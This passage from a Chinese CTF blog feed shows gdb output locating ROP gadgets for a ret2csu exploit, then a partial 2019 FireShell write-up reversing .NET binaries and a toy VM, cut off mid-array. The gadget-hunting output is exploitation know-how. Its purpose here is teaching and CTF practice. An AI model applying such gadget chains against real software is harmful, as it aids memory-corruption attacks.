class="line">assassinq&gt;&gt; x/5i 0x000000000040061F</span><br><span class="line">   0x40061f &lt;__libc_csu_init+95&gt;:pop    rbp</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">   0x400625:nop</span><br><span class="line">assassinq&gt;&gt; x/5i 0x0000000000400620</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">   0x400625:nop</span><br><span class="line">   0x400626:nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">assassinq&gt;&gt; x/5i 0x0000000000400621</span><br><span class="line">   0x400621 &lt;__libc_csu_init+97&gt;:pop    rsi</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">   0x400625:nop</span><br><span class="line">   0x400626:nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">assassinq&gt;&gt; x/5i 0x0000000000400622</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">   0x400625:nop</span><br><span class="line">   0x400626:nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:repz ret </span><br><span class="line">assassinq&gt;&gt; x/5i 0x0000000000400623</span><br><span class="line">   0x400623 &lt;__libc_csu_init+99&gt;:pop    rdi</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">   0x400625:nop</span><br><span class="line">   0x400626:nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:repz ret</span><br><span class="line">assassinq&gt;&gt; quit</span><br></pre></td></tr></table></figure><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#ret2csu" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#ret2csu</a><br><a href="https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/</a><br><a href="https://raw.githubusercontent.com/zhengmin1989/MyArticles/master/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html" target="_blank" rel="noopener">https://raw.githubusercontent.com/zhengmin1989/MyArticles/master/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html</a><br><a href="https://www.jianshu.com/p/73fff078c19c" target="_blank" rel="noopener">https://www.jianshu.com/p/73fff078c19c</a><br><a href="https://www.jianshu.com/p/a32dc72bb20f" target="_blank" rel="noopener">https://www.jianshu.com/p/a32dc72bb20f</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用蒸米的一步一步学ROP之linux_x64篇中的level5来研究一下64位的ROP。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="pwn" scheme="https://qianfei11.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2019-FireShell-review</title>
    <link href="https://qianfei11.github.io/2019/01/30/%E3%80%90%E6%9C%AA%E5%AE%8C%E6%88%90%E3%80%912019-FireShell-review/"/>
    <id>https://qianfei11.github.io/2019/01/30/【未完成】2019-FireShell-review/</id>
    <published>2019-01-30T04:51:13.000Z</published>
    <updated>2019-02-01T12:08:18.439Z</updated>
    
    <content type="html"><![CDATA[<p>比赛没打，当作练习以及看着大佬的writeup复现了一下几道二进制。</p><a id="more"></a><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Blackbox-0"><a href="#Blackbox-0" class="headerlink" title="Blackbox-0"></a>Blackbox-0</h2><p>先file一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> file Blackbox-0.exe </span><br><span class="line">Blackbox-0.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows</span><br></pre></td></tr></table></figure><p>运行程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This binary is a black box.</span><br><span class="line">This means that it was designed to be analyzed without looking it&apos;s inside contents</span><br><span class="line">You will solve the chalenge by letting the flag to be outputted in some way.</span><br><span class="line">You will need to figure out what this binary is doing by just examining it&apos;s behaviour in the environment.</span><br></pre></td></tr></table></figure><p>是<code>.NET</code>程序，故使用<a href="https://github.com/0xd4d/dnSpy" target="_blank" rel="noopener">dnSpy</a>来调试。在单步时，发现<code>\u000F\u2009</code>第354行返回一个变量<code>text</code>。</p><p><img src="/pics/2019-FireShell-review/RE/Blackbox-0/1.png" alt="可疑代码段"></p><p>在这里设下断点，并多次继续后会得到一串base64，解密得到flag：</p><p><img src="/pics/2019-FireShell-review/RE/Blackbox-0/2.png" alt="text值为base64串"></p><h2 id="Blackbox-1"><a href="#Blackbox-1" class="headerlink" title="Blackbox-1"></a>Blackbox-1</h2><p>file一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> file Blackbox-1.exe </span><br><span class="line">Blackbox-1.exe: PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows</span><br></pre></td></tr></table></figure><p>运行程序没有任何输出。同样因为是<code>.NET</code>程序，使用dnSpy调试。在<code>\u000F\u2009</code>第358行返回一个变量<code>text</code>：</p><p><img src="/pics/2019-FireShell-review/RE/Blackbox-1/1.png" alt="可疑代码段"></p><p>在此处设置断点并多次继续，<code>text</code>的值会变成flag：</p><p><img src="/pics/2019-FireShell-review/RE/Blackbox-1/2.png" alt="得到flag"></p><h2 id="babyvm"><a href="#babyvm" class="headerlink" title="babyvm"></a>babyvm</h2><p>一道简单虚拟机。运行一下出现<code>Program executed successfully!</code>。先拖进ida查看main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ( (_BYTE)end_sign )</span><br><span class="line">  &#123;</span><br><span class="line">    get_option();</span><br><span class="line">    vm_start();</span><br><span class="line">    ++j;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个函数获取一个option，然后进入<code>vm_start()</code>执行指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vm_start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *__ptr32 *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST34_4</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST3C_4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST28_4</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ST30_4</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ST24_4</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// ST18_4</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+40h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  v0 = off_33D0;</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">      ++i;</span><br><span class="line">      ++j;</span><br><span class="line">      v0 = (<span class="keyword">void</span> *__ptr32 *)buf;</span><br><span class="line">      buf[i] = code[j];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">      v1 = i--;</span><br><span class="line">      v2 = buf[v1];</span><br><span class="line">      v3 = i--;</span><br><span class="line">      v4 = buf[v3] + v2;</span><br><span class="line">      ++i;</span><br><span class="line">      v0 = (<span class="keyword">void</span> *__ptr32 *)buf;</span><br><span class="line">      buf[i] = v4;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">      LOBYTE(end_sign) = <span class="number">0</span>;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"Program executed successfully!"</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">      v5 = i--;</span><br><span class="line">      v6 = buf[v5];</span><br><span class="line">      v7 = i--;</span><br><span class="line">      v8 = v6 * buf[v7];</span><br><span class="line">      ++i;</span><br><span class="line">      v0 = (<span class="keyword">void</span> *__ptr32 *)buf;</span><br><span class="line">      buf[i] = v8;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">      v9 = i--;</span><br><span class="line">      v10 = buf[v9];</span><br><span class="line">      v11 = i--;</span><br><span class="line">      v12 = buf[v11] / v10;</span><br><span class="line">      ++i;</span><br><span class="line">      v0 = (<span class="keyword">void</span> *__ptr32 *)buf;</span><br><span class="line">      buf[i] = v12;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">      v13 = i--;</span><br><span class="line">      v14 = buf[v13];</span><br><span class="line">      v15 = i--;</span><br><span class="line">      v16 = buf[v15] - v14;</span><br><span class="line">      ++i;</span><br><span class="line">      v0 = (<span class="keyword">void</span> *__ptr32 *)buf;</span><br><span class="line">      buf[i] = v16;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现程序执行了内部的指令，没有任何与指令有关的输出。只管把指令dump出来，再把switch写出来复现一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">code = [<span class="number">0x00000000</span>, <span class="number">0x00000046</span>, <span class="number">0x00000000</span>, <span class="number">0x00000061</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000000A7</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000343</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000016D5</span>, <span class="number">0x00000000</span>, <span class="number">0x0000005C</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000016D5</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CD7D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CD7D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000048</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CD7D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000059</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CD7D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000038</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CD7D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000024</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CDA1</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CD5B</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CDA1</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CDA1</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000023</span>, <span class="number">0x00000000</span>, <span class="number">0x00000038</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000023</span>, <span class="number">0x00000000</span>, <span class="number">0x00000039</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000023</span>, <span class="number">0x00000000</span>, <span class="number">0x00000043</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000023</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000000F5</span>, <span class="number">0x00000000</span>, <span class="number">0x00000054</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000149</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0000066D</span>, <span class="number">0x00000000</span>, <span class="number">0x0000003E</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000006AB</span>, <span class="number">0x00000000</span>, <span class="number">0x0000005A</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000705</span>, <span class="number">0x00000000</span>, <span class="number">0x00000026</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000705</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000E0A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000E0A</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00008C64</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00034A58</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00170868</span>, <span class="number">0x00000000</span>, <span class="number">0x00000032</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00170868</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00170868</span>, <span class="number">0x00000000</span>, <span class="number">0x00000020</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00170868</span>, <span class="number">0x00000000</span>, <span class="number">0x00000010</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00170868</span>, <span class="number">0x00000000</span>, <span class="number">0x00000055</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00170868</span>, <span class="number">0x00000000</span>, <span class="number">0x00170845</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00170868</span>, <span class="number">0x00000000</span>, <span class="number">0x00170868</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000007B</span>, <span class="number">0x00000000</span>, <span class="number">0x0000003F</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000007B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000171</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000171</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000005C4</span>, <span class="number">0x00000000</span>, <span class="number">0x00000029</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000005ED</span>, <span class="number">0x00000000</span>, <span class="number">0x0000002D</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000005ED</span>, <span class="number">0x00000000</span>, <span class="number">0x0000004D</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000005ED</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000005F9</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00002FC8</span>, <span class="number">0x00000000</span>, <span class="number">0x00000050</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00003018</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0000C060</span>, <span class="number">0x00000000</span>, <span class="number">0x00000025</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000C085</span>, <span class="number">0x00000000</span>, <span class="number">0x00000023</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000C085</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0001810A</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000F0A64</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x001E14C8</span>, <span class="number">0x00000000</span>, <span class="number">0x0000001C</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x001E14E4</span>, <span class="number">0x00000000</span>, <span class="number">0x001E1469</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x001E14E4</span>, <span class="number">0x00000000</span>, <span class="number">0x001E14E4</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000043</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0000014F</span>, <span class="number">0x00000000</span>, <span class="number">0x00000018</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000014F</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000007DA</span>, <span class="number">0x00000000</span>, <span class="number">0x00000051</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000082B</span>, <span class="number">0x00000000</span>, <span class="number">0x0000004F</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000082B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000041</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000082B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00004158</span>, <span class="number">0x00000000</span>, <span class="number">0x00000019</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00004158</span>, <span class="number">0x00000000</span>, <span class="number">0x00000033</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00004158</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00004159</span>, <span class="number">0x00000000</span>, <span class="number">0x0000004D</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000041A6</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000189E4</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000AC53C</span>, <span class="number">0x00000000</span>, <span class="number">0x000AC4F9</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x000AC53C</span>, <span class="number">0x00000000</span>, <span class="number">0x000AC53C</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000075</span>, <span class="number">0x00000000</span>, <span class="number">0x00000054</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000075</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000249</span>, <span class="number">0x00000000</span>, <span class="number">0x00000047</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000290</span>, <span class="number">0x00000000</span>, <span class="number">0x00000012</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000002A2</span>, <span class="number">0x00000000</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000002A2</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000017B2</span>, <span class="number">0x00000000</span>, <span class="number">0x00000060</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000017B2</span>, <span class="number">0x00000000</span>, <span class="number">0x00000061</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00001813</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00003026</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00003026</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0000C098</span>, <span class="number">0x00000000</span>, <span class="number">0x00000045</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000C098</span>, <span class="number">0x00000000</span>, <span class="number">0x00000052</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000C0EA</span>, <span class="number">0x00000000</span>, <span class="number">0x00000037</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000C121</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00030484</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00121B18</span>, <span class="number">0x00000000</span>, <span class="number">0x00121AA3</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00121B18</span>, <span class="number">0x00000000</span>, <span class="number">0x00121B18</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000035</span>, <span class="number">0x00000000</span>, <span class="number">0x00000039</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000035</span>, <span class="number">0x00000000</span>, <span class="number">0x00000011</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000046</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0000008C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000003D4</span>, <span class="number">0x00000000</span>, <span class="number">0x00000063</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000003D4</span>, <span class="number">0x00000000</span>, <span class="number">0x0000002D</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000003D4</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000016F8</span>, <span class="number">0x00000000</span>, <span class="number">0x00000050</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000016F8</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000016FB</span>, <span class="number">0x00000000</span>, <span 